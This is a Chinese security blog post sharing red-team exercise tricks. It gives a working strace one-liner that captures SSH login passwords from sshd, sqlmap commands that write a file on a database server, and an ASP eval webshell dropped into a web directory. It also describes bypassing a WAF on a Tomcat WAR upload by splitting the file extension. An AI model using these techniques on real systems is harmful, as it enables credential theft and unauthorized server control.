#  聊聊那些红队攻击中的"奇技淫巧"

原创 JC  [ JC的安全之路 ](javascript:void\(0\);)

**JC的安全之路** ![]()

微信号 csec527

功能介绍 一个安全从业者的想法见解 ，每周随缘更新1-2篇

____

___发表于_

收录于合集

#bypass 3 个

#红队相关 5 个

#安全小技巧 9 个

  

#

**前 言**  
  

 **你不必做一个无所不能的英雄人物**

  

 **01** **strace的妙用  
**

  

假设一个攻击场景：

  你的入口机器是一台Linux，并且发现所处C段大部分为Linux，此时也提权至root了，对于其他网段而言，你必须跨出你所在的C段才能跨到别的地址段去（
**这是一台业务服务器，站库分离，通过检索配置文件可以拿到数据库权限，但是Mysql，并未多少利用点** ）。

      你想起了可以尝试用 **MimiPenguin** 抓取密码？奈何密码没抓到。

   通过长期的 **蹲点** ，你发现业务管理员每周五下午会定时登录一次，有时早，有时晚（可能是人工巡检，也可能是脚本登录）？

     此时你想或许可以尝试监听管理员的密码？很快，你想起了 **strace命令** 可以监听一手密码

  *   * 

    
    
    (strace -f -F -p `ps aux|grep "sshd -D"|grep -v grep|awk {'print $2'}` -t -e trace=read,write -s 32 2> /tmp/sshd.log &)grep -E 'read\(6, ".+\\0\\0\\0\\.+"' /tmp/sshd.log

很幸运，你在这周五管理员上线的时候，捕获到了密码：  

![]()  

接下来，你发现这个C段的IP全部是通用密码，很轻松突破了隔离网段。

  

  

 **0 2** **不出网的Mssql注入（中文目录写webshell）  
**

###  ****

  

  
  
  
某次演练： 【09:00:10】你运气不错，开局就是一枚mssql
堆叠注入！【09:00:40】你掏出你的珍藏sqlmap开始梭哈：![]()【09:02:10】你看到权限是dba，果断的尝试--os-
shell执行命令。【09:03:10】你运气很好，成功的执行出了命令，但是很快你笑不出来了，你发现虽然可以执行命令，但是TCP/UDP均不出网。【09:05:10】你心想：不出网又怎样，我写webshell总行吧，开梭，于是飞速敲下一条命令：![]()【09:05:40】你很快定位到了web目录，但是WEB目录是中文目录，你尝试写入，但是写入失败了。【09:06:20】你开始冥思苦想......一千年Later......【09:08:10】你开始百度，你发现可以通过sqlmap上传写好的bat脚本，把webshell写入web目录：  

> python sqlmap.py -r aaaaaaaa.txt --batch --file-write ahell.bat -file-dest
> c:\users\public\music\ashell.bat

![]()ashell.bat的内容

> echo ^<%%eval request("aaaaaa")%%^>
> >D:\\\张三的马赛克\\\Content\\\images\\\logo1.asp

【09:08:30】你再次执行os-
shell，此时你惊喜的发现bat已经落地，你执行了ashell.bat，返回为空，证明执行成功。![]()【09:08:31】你怀揣着激动的心情访问了webshell地址，惊喜的发现webshell写入成功！![]()

  

 **0 3** **Tomcat上传war包绕过WAF**

  

也是某次演练：

【09:00:10】你看着主办方发的目标，陷入沉思。【09:00:11】你盘算了一下，随机选中一名幸运目标，开始收集资产渗透。【09:00:12】很不走运，你发现这个目标几乎没有互联网映射，无奈放弃。【09:00:13】你看着主办方发的目标，再次陷入沉思.....【09:00:14】你飞快的盘算了一下，随机再次选中一名幸运目标，开始收集资产渗透。【09:00:24】很幸运，这次可以打的目标很多，但是全都被WAF套牢，你尝试绕过，但是没有成功...【09:02:14】你开始百度...“
**bypass WAF的1888种手段** ”..." **文件上传的一百零单八种姿势** "..." **看我如何调教xx WAF** "...  
【09:20:14】你眉头一皱，发觉事情并不简单...【09:20:18】你放弃了检索...【09:21:14】突然，你游离的目光突然发现一个冷门端口的tomcat页面，并且版本是是tomcat
7。【09:21:15】你飞快的尝试了99种密码组合。【09:22:23】 **很幸运！你登陆了tomcat 后台！**
【09:22:34】你迅速的制作了一个包含webshell的WAR包进行部署。【09:22:44】很遗憾，被WAF拦截了。【09:23:02】你想起师傅传授你的绕过方法（
**利用\\\\\拆分后缀，绕过waf** ），试探性的绕了一下：![]()  
【09:24:14】 **你发现waf没有告警，也没有拦截。**
【09:25:00】你访问你的webshell，发现连接成功了![]()【09:25:08】你看着眼前的success，却并没有露出高兴的神情，反而惘然若失...【09:30:14】只见你突然喃喃道：
**为什么当初不肯多学亿点...**

  

 **0 4** **后话  
**

  

以上纯属本人臆想与胡编乱造，请用手中的兵器试证明之。  

  

  

  

  

![]()

  

  

  

  
 **E ND**  
![]() **扫 码关注了解更多**安全小技巧  
  

  

  

  
  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

